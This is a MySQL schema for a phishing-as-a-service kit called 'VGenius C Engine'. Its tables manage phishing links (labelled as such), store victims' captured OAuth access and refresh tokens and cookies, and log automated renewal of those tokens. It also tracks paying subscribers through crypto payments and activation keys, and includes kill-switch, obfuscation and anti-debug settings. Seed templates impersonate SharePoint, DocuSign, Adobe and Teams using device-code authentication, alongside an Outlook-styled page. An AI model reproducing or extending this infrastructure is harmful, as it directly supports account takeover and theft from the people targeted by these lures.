-- VGenius C Engine Database Schema
-- MySQL 8.0+

CREATE DATABASE IF NOT EXISTS vgenius CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;
USE vgenius;

-- Users table
CREATE TABLE users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    login_key VARCHAR(255) NOT NULL UNIQUE,
    login_key_encrypted TEXT,
    activation_code VARCHAR(64) UNIQUE,
    subscription_status ENUM('active','expired','suspended','banned') DEFAULT 'active',
    subscription_plan ENUM('trial','full','lifetime') DEFAULT 'trial',
    subscription_expiry DATETIME,
    theme ENUM('dark','light','oled') DEFAULT 'dark',
    telegram_id VARCHAR(64),
    telegram_bot_token VARCHAR(255),
    notify_login TINYINT(1) DEFAULT 1,
    notify_prt TINYINT(1) DEFAULT 1,
    totp_enabled TINYINT(1) DEFAULT 0,
    totp_secret VARCHAR(128),
    two_fa_method ENUM('none','totp','telegram') DEFAULT 'none',
    cf_api_token VARCHAR(255),
    cf_account_id VARCHAR(128),
    cf_workers_subdomain VARCHAR(128),
    bunny_api_key VARCHAR(255),
    bunny_storage_zone VARCHAR(128),
    bunny_storage_region VARCHAR(128),
    bunny_pull_url VARCHAR(255),
    last_login DATETIME,
    login_attempts INT DEFAULT 0,
    locked_until DATETIME,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    updated_at DATETIME DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
);

-- Admin users
CREATE TABLE admins (
    id INT AUTO_INCREMENT PRIMARY KEY,
    email VARCHAR(255) NOT NULL UNIQUE,
    password_hash VARCHAR(255) NOT NULL,
    role ENUM('superadmin','admin','viewer') DEFAULT 'admin',
    last_login DATETIME,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
);

-- Links (phishing links)
CREATE TABLE links (
    id INT AUTO_INCREMENT PRIMARY KEY,
    user_id INT NOT NULL,
    name VARCHAR(128),
    worker_name VARCHAR(64) UNIQUE,
    template_type VARCHAR(64),
    verification_design VARCHAR(64) DEFAULT 'outlook',
    auth_mode ENUM('token','cookie') DEFAULT 'token',
    destination_url VARCHAR(512) DEFAULT 'https://office.com',
    custom_domain VARCHAR(255),
    url_type ENUM('worker','custom','export') DEFAULT 'worker',
    domain_connection ENUM('subdomain','root') DEFAULT 'subdomain',
    route_name VARCHAR(128),
    file_name VARCHAR(255),
    pages INT DEFAULT 1,
    title_text VARCHAR(255),
    message_text TEXT,
    button_text VARCHAR(128),
    background_blur INT DEFAULT 4,
    blob_url_enabled TINYINT(1) DEFAULT 0,
    copy_to_open TINYINT(1) DEFAULT 0,
    custom_bg_url VARCHAR(512),
    status ENUM('active','disabled','killed') DEFAULT 'active',
    jwt_payload TEXT,
    turnstile_enabled TINYINT(1) DEFAULT 1,
    obfuscated TINYINT(1) DEFAULT 0,
    kill_switched TINYINT(1) DEFAULT 0,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    updated_at DATETIME DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
);

-- Captured tokens
CREATE TABLE captured_tokens (
    id INT AUTO_INCREMENT PRIMARY KEY,
    user_id INT NOT NULL,
    link_id INT,
    email VARCHAR(320),
    token_type ENUM('token','cookie') DEFAULT 'token',
    access_token_encrypted TEXT,
    refresh_token_encrypted TEXT,
    id_token_encrypted TEXT,
    cookies_encrypted TEXT,
    ip_address VARCHAR(45),
    user_agent TEXT,
    notes TEXT,
    expiration DATETIME,
    last_renewed DATETIME,
    renewal_count INT DEFAULT 0,
    renewal_attempts INT DEFAULT 0,
    stale TINYINT(1) DEFAULT 0,
    deleted TINYINT(1) DEFAULT 0,
    deleted_at DATETIME,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    tenant VARCHAR(128) DEFAULT 'common',
    template_type VARCHAR(64),
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE,
    FOREIGN KEY (link_id) REFERENCES links(id) ON DELETE SET NULL
);

-- Cookie renewals log
CREATE TABLE cookie_renewals (
    id INT AUTO_INCREMENT PRIMARY KEY,
    capture_id INT NOT NULL,
    user_id INT NOT NULL,
    user_code VARCHAR(64),
    success TINYINT(1) DEFAULT 1,
    ip_address VARCHAR(45),
    renewal_type VARCHAR(32),
    error_message TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (capture_id) REFERENCES captured_tokens(id) ON DELETE CASCADE,
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
);

-- Visitors
CREATE TABLE visitors (
    id INT AUTO_INCREMENT PRIMARY KEY,
    user_id INT NOT NULL,
    link_id INT,
    ip_address VARCHAR(45),
    country VARCHAR(64) DEFAULT 'Unknown',
    user_agent TEXT,
    worker_name VARCHAR(64),
    status ENUM('waiting','timeout','done','blocked') DEFAULT 'waiting',
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE,
    FOREIGN KEY (link_id) REFERENCES links(id) ON DELETE SET NULL
);

-- Visitor access settings per user
CREATE TABLE visitor_settings (
    id INT AUTO_INCREMENT PRIMARY KEY,
    user_id INT NOT NULL UNIQUE,
    block_done_visitors TINYINT(1) DEFAULT 0,
    redirect_url VARCHAR(512),
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
);

-- Payments
CREATE TABLE payments (
    id INT AUTO_INCREMENT PRIMARY KEY,
    user_id INT,
    payment_uid VARCHAR(128) UNIQUE,
    coin VARCHAR(16),
    amount_usd DECIMAL(10,2),
    amount_crypto DECIMAL(20,8),
    wallet_address VARCHAR(255),
    status ENUM('pending','confirmed','expired','failed') DEFAULT 'pending',
    renew_key VARCHAR(64),
    invoice_id VARCHAR(128),
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    expires_at DATETIME,
    confirmed_at DATETIME,
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE SET NULL
);

-- Activation keys
CREATE TABLE activation_keys (
    id INT AUTO_INCREMENT PRIMARY KEY,
    key_code VARCHAR(64) NOT NULL UNIQUE,
    plan ENUM('trial','full','lifetime') DEFAULT 'full',
    duration_days INT DEFAULT 30,
    usage_limit INT DEFAULT 1,
    times_used INT DEFAULT 0,
    status ENUM('unused','used','expired','revoked') DEFAULT 'unused',
    created_by_admin_id INT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    expires_at DATETIME
);

-- Notices (notice board)
CREATE TABLE notices (
    id INT AUTO_INCREMENT PRIMARY KEY,
    title VARCHAR(255),
    content TEXT,
    active TINYINT(1) DEFAULT 1,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    updated_at DATETIME DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
);

-- Feedback
CREATE TABLE feedback (
    id INT AUTO_INCREMENT PRIMARY KEY,
    user_id INT NOT NULL,
    subject VARCHAR(255),
    message TEXT,
    status ENUM('open','resolved','closed') DEFAULT 'open',
    admin_reply TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    updated_at DATETIME DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
);

-- Audit log (immutable)
CREATE TABLE audit_log (
    id INT AUTO_INCREMENT PRIMARY KEY,
    admin_id INT,
    action VARCHAR(255),
    details TEXT,
    ip_address VARCHAR(45),
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
);

-- Admin settings
CREATE TABLE settings (
    id INT AUTO_INCREMENT PRIMARY KEY,
    setting_key VARCHAR(128) NOT NULL UNIQUE,
    setting_value TEXT,
    updated_at DATETIME DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
);

-- Templates (database-driven)
CREATE TABLE templates (
    id INT AUTO_INCREMENT PRIMARY KEY,
    name VARCHAR(128) NOT NULL,
    category ENUM('preload','no_preload') DEFAULT 'preload',
    version VARCHAR(16) DEFAULT '1.0.0',
    status ENUM('active','disabled') DEFAULT 'active',
    config_json TEXT,
    thumbnail_url VARCHAR(512),
    zip_path VARCHAR(512),
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    updated_at DATETIME DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
);

-- Verification designs (database-driven)
CREATE TABLE verification_designs (
    id INT AUTO_INCREMENT PRIMARY KEY,
    name VARCHAR(128) NOT NULL,
    css_content TEXT,
    html_wrapper TEXT,
    thumbnail_url VARCHAR(512),
    status ENUM('active','disabled') DEFAULT 'active',
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    updated_at DATETIME DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
);

-- User sessions
CREATE TABLE user_sessions (
    id INT AUTO_INCREMENT PRIMARY KEY,
    user_id INT NOT NULL,
    session_token VARCHAR(255) NOT NULL UNIQUE,
    ip_address VARCHAR(45),
    ip_address_encrypted TEXT,
    user_agent TEXT,
    device_info VARCHAR(255),
    is_current TINYINT(1) DEFAULT 0,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    last_seen DATETIME DEFAULT CURRENT_TIMESTAMP,
    expires_at DATETIME,
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
);

-- Deployment logs (worker errors)
CREATE TABLE deployment_logs (
    id INT AUTO_INCREMENT PRIMARY KEY,
    link_id INT NOT NULL,
    error_message TEXT,
    stack_trace TEXT,
    user_agent VARCHAR(512),
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (link_id) REFERENCES links(id) ON DELETE CASCADE
);

-- Login history
CREATE TABLE login_history (
    id INT AUTO_INCREMENT PRIMARY KEY,
    user_id INT,
    admin_id INT,
    ip_address VARCHAR(45),
    user_agent TEXT,
    success TINYINT(1) DEFAULT 1,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
);

-- Blacklist
CREATE TABLE blacklist (
    id INT AUTO_INCREMENT PRIMARY KEY,
    email_pattern VARCHAR(255),
    domain VARCHAR(255),
    reason VARCHAR(255),
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE IF NOT EXISTS sub_users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    parent_user_id INT NOT NULL,
    login_key VARCHAR(255) NOT NULL UNIQUE,
    permissions JSON,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (parent_user_id) REFERENCES users(id) ON DELETE CASCADE
);

-- Telegram OTP table for 2FA verification
CREATE TABLE IF NOT EXISTS telegram_otp (
    id INT AUTO_INCREMENT PRIMARY KEY,
    user_id INT NOT NULL,
    otp_hash VARCHAR(64) NOT NULL,
    expires_at DATETIME NOT NULL,
    used TINYINT(1) DEFAULT 0,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE,
    INDEX idx_telegram_otp_user (user_id),
    INDEX idx_telegram_otp_expires (expires_at)
);

-- Insert default settings
INSERT INTO settings (setting_key, setting_value) VALUES
('subscription_price_usd', '50'),
('subscription_duration_days', '30'),
('maintenance_mode', 'false'),
('maintenance_message', 'System under maintenance. Please try again later.'),
('registrations_locked', 'false'),
('obfuscation_enabled', 'false'),
('antidebug_enabled', 'false'),
('renewal_interval_hours', '6'),
('renewal_window_hours', '6'),
('max_renewal_attempts', '3'),
('cookie_default_ttl_hours', '24'),
('multi_service_renewal', 'false'),
('azure_tenant', 'common'),
('rate_limit_window_ms', '900000'),
('rate_limit_max_requests', '100');

-- Insert default verification designs
INSERT INTO verification_designs (name, css_content, html_wrapper, status) VALUES
('Outlook', '
.verification-wrapper { background: #f3f4f6; min-height: 100vh; display: flex; align-items: center; justify-content: center; font-family: "Segoe UI", sans-serif; }
.verification-card { background: #ffffff; border-radius: 8px; box-shadow: 0 2px 16px rgba(0,0,0,0.1); padding: 40px; max-width: 440px; width: 100%; border-top: 4px solid #0078d4; }
', '<div class="verification-wrapper"><div class="verification-card"><div id="templateContent"></div></div></div>', 'active'),
('Minimal Clean', '
.verification-wrapper { background: #fafafa; min-height: 100vh; display: flex; align-items: center; justify-content: center; font-family: "Inter", sans-serif; }
.verification-card { background: #ffffff; border-radius: 16px; box-shadow: 0 4px 24px rgba(0,0,0,0.06); padding: 48px; max-width: 420px; width: 100%; border: 1px solid #e5e7eb; }
', '<div class="verification-wrapper"><div class="verification-card"><div id="templateContent"></div></div></div>', 'active');

-- Performance indexes
CREATE INDEX idx_captured_tokens_user_id ON captured_tokens(user_id);
CREATE INDEX idx_captured_tokens_link_id ON captured_tokens(link_id);
CREATE INDEX idx_captured_tokens_deleted ON captured_tokens(user_id, deleted, created_at);
CREATE INDEX idx_links_user_id ON links(user_id);
CREATE INDEX idx_links_worker_name ON links(worker_name);
CREATE INDEX idx_visitors_user_id ON visitors(user_id);
CREATE INDEX idx_visitors_link_id ON visitors(link_id);
CREATE INDEX idx_payments_user_id ON payments(user_id);
CREATE INDEX idx_cookie_renewals_capture_id ON cookie_renewals(capture_id);
CREATE INDEX idx_cookie_renewals_user_id ON cookie_renewals(user_id);
CREATE INDEX idx_deployment_logs_link_id ON deployment_logs(link_id);
CREATE INDEX idx_login_history_user_id ON login_history(user_id);
CREATE INDEX idx_login_history_admin_id ON login_history(admin_id);
CREATE INDEX idx_feedback_user_id ON feedback(user_id);
CREATE INDEX idx_user_sessions_user_id ON user_sessions(user_id);
CREATE INDEX idx_user_sessions_token ON user_sessions(session_token);
CREATE INDEX idx_sub_users_parent ON sub_users(parent_user_id);

-- Insert seed templates (5 templates)
INSERT INTO templates (name, category, config_json, status) VALUES
('SharePoint 3', 'preload', '{"name":"SharePoint 3","preload":true,"auth_mode":"devicecode","fields":[{"key":"file_name","label":"File Name","type":"text","default":"Company_Policy.pdf"},{"key":"pages","label":"Pages","type":"number","default":12}],"background":{"default":"sharepoint_bg.jpg","editable":true,"blur":true}}', 'active'),
('DocuSign 4', 'preload', '{"name":"DocuSign 4","preload":true,"auth_mode":"devicecode","fields":[{"key":"file_name","label":"File Name","type":"text","default":"Contract_Agreement.pdf"},{"key":"pages","label":"Pages","type":"number","default":8}],"background":{"default":"docusign_bg.jpg","editable":true,"blur":true}}', 'active'),
('Adobe 3', 'preload', '{"name":"Adobe 3","preload":true,"auth_mode":"devicecode","fields":[{"key":"file_name","label":"File Name","type":"text","default":"NDA-2026-Final.pdf"},{"key":"pages","label":"Pages","type":"number","default":4}],"background":{"default":"adobe_bg.jpg","editable":true,"blur":true}}', 'active'),
('Teams Meeting 2', 'no_preload', '{"name":"Teams Meeting 2","preload":false,"auth_mode":"devicecode","fields":[{"key":"title","label":"Title","type":"text","default":"Weekly Standup"},{"key":"message","label":"Message","type":"text","default":"Sign in to join your meeting"}],"background":{"default":"teams_bg.jpg","editable":true,"blur":true}}', 'active'),
('DocuSign No-Preload', 'no_preload', '{"name":"DocuSign No-Preload","preload":false,"auth_mode":"devicecode","fields":[{"key":"file_name","label":"File Name","type":"text","default":"Document_Details.pdf"},{"key":"pages","label":"Pages","type":"number","default":12}],"background":{"default":"docusign_bg.jpg","editable":true,"blur":true}}', 'active');
